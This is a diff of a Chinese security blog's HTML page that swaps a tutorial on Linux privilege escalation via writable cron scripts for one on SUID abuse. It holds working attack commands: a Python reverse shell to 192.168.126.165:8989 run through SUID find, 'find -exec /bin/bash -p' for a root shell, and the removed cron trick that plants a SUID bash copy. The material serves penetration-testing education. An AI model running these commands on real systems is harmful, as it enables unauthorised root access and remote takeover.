@@ -17,7 +17,7 @@
   <meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚">
   <meta name="author" content="iceH">
   <meta name="keywords" content="">
-  <title>Linux提权之定时任务 - iceH’s Blog</title>
+  <title>Linux提权之Suid提权 - iceH’s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Linux提权之定时任务">
+            <span class="h2" id="subtitle" title="Linux提权之Suid提权">
               
             </span>
 
@@ -206,8 +206,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-11-26 15:40" pubdate>
-        2020年11月26日 下午
+      <time datetime="2020-11-27 13:44" pubdate>
+        2020年11月27日 下午
       </time>
     </span>
   
@@ -218,7 +218,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      676 字
+      609 字
     </span>
   
 
@@ -228,7 +228,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      7
        分钟
     </span>
   
@@ -258,73 +258,55 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Linux提权之定时任务</h1>
+            <h1 style="display: none">Linux提权之Suid提权</h1>
             
             <div class="markdown-body">
-              <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/01.png" srcset="/img/loading.gif" alt="Linux提权之定时任务"></p>
-<p>比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。</p>
-<pre><code class="hljs bash">1 0 * * * <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/apache/error_log</code></pre>
+              <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。例如，Linux ping命令通常需要root权限才能打开原始网络套接字。只要低特权用户执行suid权限程序，便会以root特权执行。</p>
+<p>SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。</p>
+<p>许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。</p>
+<h2 id="常见的可用于suid提权的命令"><a href="#常见的可用于suid提权的命令" class="headerlink" title="常见的可用于suid提权的命令"></a>常见的可用于suid提权的命令</h2><pre><code class="hljs bash">Nmap
 
-<p>如果未正确配置Cron，则可以利用它获得root特权。</p>
-<ol>
-<li>cron作业中是否有可写的脚本或二进制文件？</li>
-<li>我们可以覆盖cron文件本身吗？</li>
-<li>cron.d目录可写吗？</li>
-</ol>
-<p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="创建一个定时任务"><a href="#创建一个定时任务" class="headerlink" title="创建一个定时任务"></a>创建一个定时任务</h3><p>目标：创建一个运行python脚本来擦除特定目录的所有数据<br>假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：</p>
-<pre><code class="hljs bash">mkdir cleanup
-<span class="hljs-built_in">cd</span> cleanup
-<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello freinds&quot;</span> &gt; 1.txt
-<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ALL files will be deleted in 2 mints&quot;</span> &gt; 2.txt
-<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 1.php
-<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 2.php
-ls</code></pre>
+Vim
 
-<p>下图是上面命令执行的结果：</p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/02.png" srcset="/img/loading.gif" alt="创建文件"></p>
-<p>下面我们写一个python程序来删除 /home/cleanup的内容。</p>
-<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp
-vi cleanup.py</code></pre>
+find
 
-<pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python</span>
-import os
-import sys
-try:
-   os.system(<span class="hljs-string">&#x27;rm -r /root/cleanup/* &#x27;</span>)
-except:
-    sys.exit()</code></pre>
+Bash
 
-<p><code>chmod 777 cleanup.py</code></p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/03.png" srcset="/img/loading.gif" alt="创建文件"></p>
-<p>编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。</p>
-<pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>crontab
-*<span class="hljs-regexp">/2 *   * * *   root    /</span>tmp/cleanup.py</code></pre>
+More
 
-<p>下面是运行效果</p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/04.png" srcset="/img/loading.gif" alt="创建文件"></p>
-<p>在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。</p>
-<p>pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。</p>
-<p>该工具的下载地址：</p>
-<pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DominicBreuker/</span>pspy</code></pre>
+Less
 
-<p>首先将pspy上传到目标机器：</p>
-<p>1）chmod +x pspy64s</p>
-<p>2）./pspy64</p>
-<p>观察一段时间，发现/tmp/cleanup.py为root权限执行。</p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/05.png" srcset="/img/loading.gif" alt="pspy64s"></p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/06.png" srcset="/img/loading.gif" alt="pspy64s"></p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>查看/tmp/cleanup.py权限为普通用户可写</p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/07.png" srcset="/img/loading.gif" alt="查看权限"></p>
-<p>打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(‘rm -r /home/cleanup/* ‘)”：</p>
-<pre><code class="hljs clean">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</code></pre>
+Nano
 
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/08.png" srcset="/img/loading.gif" alt="修改文件"></p>
-<p>2分钟后，tmp目录下就会存在SUID权限的bash，运行<code>/tmp/bash -p </code>后就获取了root权限。</p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/09.png" srcset="/img/loading.gif" alt="利用成功"></p>
-<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/10.png" srcset="/img/loading.gif" alt="root权限"></p>
-<p>提权成功。</p>
+cp</code></pre>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。</p>
+<p>该脚本的下载地址：</p>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum</code></pre>
+
+<p>执行LinEnum之后，发现find这个命令有SUID权限。</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/01.jpg" srcset="/img/loading.gif" alt="收集信息"></p>
+<h3 id="确认-find-有-root-执行权限"><a href="#确认-find-有-root-执行权限" class="headerlink" title="确认 find 有 root 执行权限"></a>确认 find 有 root 执行权限</h3><p>执行命令</p>
+<pre><code class="hljs bash">touch ice
+/usr/bin/find ice -<span class="hljs-built_in">exec</span> whoami \;</code></pre>
+
+<p>确认 find 命令是否是 root 权限执行.</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/02.jpg" srcset="/img/loading.gif" alt="root"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果目标机上有 python 环境，可以使用 python 命令反弹 shell：</p>
+<pre><code class="hljs bash"><span class="hljs-comment">#反弹一个sh类型的shell</span>
+python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></code></pre>
+
+<p>结合 find :</p>
+<pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;</code></pre>
+
+<p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid <code>（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）</code>为 root 权限，但是反弹 shell 中并没有。</p>
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/03.jpg" srcset="/img/loading.gif" alt="非root权限"></p>
+<p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p>
+<p>我们尝试使用如下命令获取 shell：</p>
+<pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre>
+
+<p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/04.jpg" srcset="/img/loading.gif" alt="提权成功"></p>
+<p>可以看到获取的 shell 为 root 权限。</p>
 
             </div>
             <hr>
@@ -349,7 +331,7 @@ except:
               </div>
               <p class="note note-warning">
               <strong>本文作者: </strong><a href="/">iceH</a> <br>
-              <strong>本文链接: </strong><a href="http://www.secice.cn/post/75fd4604">http://www.secice.cn/post/75fd4604</a> <br>
+              <strong>本文链接: </strong><a href="http://www.secice.cn/post/a20c8cf4">http://www.secice.cn/post/a20c8cf4</a> <br>
               <strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  </p>
                  
@@ -358,9 +340,9 @@ except:
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/post/a20c8cf4">
+                      <a href="/post/94404766">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Linux提权之Suid提权</span>
+                        <span class="hidden-mobile">Linux提权之Sudo配置错误</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -368,8 +350,8 @@ except:
                   <article class="post-next col-6">
                     
                     
-                      <a href="/post/3574493e">
-                        <span class="hidden-mobile">Linux提权之内核漏洞</span>
+                      <a href="/post/75fd4604">
+                        <span class="hidden-mobile">Linux提权之定时任务</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
